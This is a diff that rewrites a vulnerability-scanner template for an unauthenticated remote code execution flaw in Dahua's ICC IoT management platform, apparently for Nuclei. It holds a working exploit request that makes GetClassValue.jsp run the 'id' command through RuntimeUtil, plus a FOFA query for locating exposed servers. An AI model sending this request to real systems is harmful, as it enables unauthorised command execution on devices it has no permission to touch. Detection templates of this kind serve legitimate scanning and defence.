@@ -1,32 +1,36 @@
+http:
+- matchers:
+  - part: body
+    regex:
+    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - "POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1\nHost: {{Hostname}}\n\
+    Content-Type: application/json\n\n{\n    \"data\": {\n        \"clazzName\": \"\
+    com.dahua.admin.util.RuntimeUtil\",\n        \"methodName\": \"syncexecReturnInputStream\"\
+    ,\n        \"fieldName\": [\"id\"]\n    }\n}\n"
 id: dahua-icc-getclassvalue-rce
-
 info:
-  name: 大华 ICC 智能物联综合管理平台 GetClassValue RCE
-  author: avic123
-  severity: critical
-  verified: true
-  description: |-
-    大华智能物联综合管理平台GetClassValue.jsp存在远程代码执行漏洞，攻击者可获取服务器权限
-    fofa: app="dahua-智能物联综合管理平台"
-  reference:
-    - https://cn-sec.com/archives/3585607.html
-  tags: dahua,icc,rce
-  created: 2025/01/06
+  author: ProjectDiscoveryAI
+  classification:
+    cwe-id:
+    - CWE-470
+    - CWE-78
+    - CWE-94
+  description: 'Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated
+    Management Platform via GetClassValue.jsp.
 
-rules:
-  r0:
-    request:
-      method: POST
-      path: /evo-apigw/admin/API/Developer/GetClassValue.jsp
-      headers:
-        Content-Type: application/json
-      body: |
-        {
-          "data": {
-            "clazzName": "com.dahua.admin.util.RuntimeUtil",
-            "methodName": "syncexecReturnInputStream",
-            "fieldName": ["id"]
-          }
-        }
-    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
-expression: r0()
+    '
+  metadata:
+    fofa-query: "app=\"dahua-\u667A\u80FD\u7269\u8054\u7EFC\u5408\u7BA1\u7406\u5E73\
+      \u53F0\""
+    max-request: 1
+  name: Dahua 'GetClassValue' - Remote Code Execution
+  reference:
+  - https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/dahua-icc-getclassvalue-rce.yaml
+  severity: critical
+  tags: dahua,iot,java,rce,unauth,vuln
